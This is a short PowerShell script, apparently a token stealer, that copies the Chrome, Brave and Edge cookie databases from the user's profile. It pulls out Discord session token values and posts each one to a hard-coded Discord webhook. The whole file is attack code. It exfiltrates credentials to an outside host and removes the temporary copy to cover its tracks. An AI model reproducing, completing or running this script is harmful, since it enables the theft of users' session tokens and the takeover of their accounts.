$webhookUrl = "https://discord.com/api/webhooks/1508519789566496950/B3L__pijUlyH20EfneD3XeA2CwwzCw0HteEze4taaUyxD1txNgPF2BwVXgeJzG-3Ifme"
Add-Type -AssemblyName System.Web

$cookiePaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
)

foreach ($cookiePath in $cookiePaths) {
    if (Test-Path $cookiePath) {
        Copy-Item $cookiePath "$env:TEMP\cookies_copy.sqlite" -Force
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\cookies_copy.sqlite")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT value FROM cookies WHERE host_key LIKE '%discord%' AND name = 'token'"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $token = $reader.GetString(0)
            $payload = @{content = "**Cookie Token:** $token"} | ConvertTo-Json
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
        }
        $conn.Close()
        Remove-Item "$env:TEMP\cookies_copy.sqlite" -Force
    }
}
